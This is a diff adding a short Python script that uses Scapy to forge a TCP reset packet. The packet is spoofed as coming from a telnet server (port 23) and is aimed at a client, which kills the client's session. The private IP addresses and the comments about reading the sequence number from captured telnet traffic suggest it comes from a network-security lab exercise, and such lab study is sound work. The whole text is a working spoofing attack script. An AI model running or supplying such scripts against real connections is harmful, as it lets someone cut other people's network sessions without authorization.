@@ -1,0 +1,15 @@
+# pretend to be the server and send a reset packet to the client IP
+#!/usr/bin/python3
+from scapy.all import *
+
+# Define IP and TCP header fields
+ip = IP(src="192.168.182.141", dst="192.168.182.138")   # source IP is the server IP , destination IP is the client IP
+tcp = TCP(sport=23, dport=57438, seq=167800952, flags="R") # source port is 23, destination port should be checked, check TELNET packet for the next sequence number
+
+# Construct the RST packet
+pkt = ip/tcp
+
+ls(pkt)
+
+# Send the packet
+send(pkt, verbose=0)
